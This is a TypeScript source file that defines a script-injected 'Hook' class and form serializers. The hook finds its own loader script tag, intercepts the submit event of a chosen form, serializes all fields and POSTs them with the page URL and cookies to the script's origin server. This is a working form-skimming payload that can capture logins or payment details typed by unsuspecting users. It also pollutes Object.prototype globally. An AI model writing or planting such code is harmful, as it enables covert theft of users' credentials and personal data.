FormData.prototype.serializeObject = function () {
    const obj: Record<any, any> = {};
    for (const pair of this.entries()) {
        let key = pair[0];
        if (key.endsWith('[]')) {
            key = key.slice(0, -2);
            if (!obj[key]) {
                obj[key] = [];
            }
            obj[key].push(pair[1]);
        } else {
            obj[key] = pair[1];
        }
    }

    let reformattedObj: Record<any, any> = {};
    Object.keys(obj).forEach(function (key) {
        let parts = key.split('[');
        let current = reformattedObj;
        for (let i = 0; i < parts.length; i++) {
            let part = parts[i];
            if (part.endsWith(']')) {
                part = part.slice(0, -1);
            }
            if (i === parts.length - 1) {
                current[part] = obj[key];
            } else {
                if (!(part in current)) {
                    current[part] = {};
                }
                current = current[part];
            }
        }
    });
    return reformattedObj;
};
HTMLFormElement.prototype.serializeObject = function () {
    return new FormData(this).serializeObject();
};
Object.prototype.serializeJSON = function () {
    return JSON.stringify(this);
};
let _wx_ = (document.currentScript ?? document.querySelector('script[id="hook-loader"]')) as HTMLScriptElement;
console.warn('_wx_', _wx_);

interface IHook {
    send(payload: object): Promise<void>;

    intercept(selector: string): void;

    init(selector: string): void;
}

class Hook implements IHook {
    constructor() {

        // @ts-ignore
        this.uri = new URL(_wx_.src.replace(/^(\/\/)/, window.location.protocol + '//'))
    }

    // @ts-ignore
    private _uri: URL;

    get uri(): URL {
        return this._uri;
    }

    set uri(value: URL) {
        this._uri = value;
    }

    async send(payload: object) {
        console.warn('send', payload);
        const srv = this.uri.origin + this.uri.pathname.split('/').slice(0, -1).join('/');
        return await fetch(srv, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            referrerPolicy: "unsafe-url",
            credentials: "include",
            redirect: "follow",
            body: {origin: window.location.href, ...payload}.serializeJSON(),
        })
            .then((response) => {
                console.warn('fetch', response.status);
                return response.text();
            })
            .catch((reason) => reason);
    }

    intercept(selector: string) {
        const element = document.querySelector(selector) as HTMLFormElement;
        const interceptToggle = (yes: boolean = true) => yes ? element.addEventListener('submit', submithandler) : element.removeEventListener('submit', submithandler)
        const submithandler = async (e: SubmitEvent) => {
            e.stopPropagation();
            interceptToggle(false);
            const payload = e.target.serializeObject()
            console.warn('payload', payload);
            void await this.send(payload)
                .then(function (data) {
                    console.warn('send', data);
                    e.preventDefault();
                })
                .catch(function (reason) {
                    console.error('send', reason);
                    e.preventDefault();
                });
        }
        interceptToggle();
    }

    init(selector: string) {
        window.document.addEventListener(
            'DOMContentLoaded',
            () => this.intercept(selector),
            true,
        );
    }
}
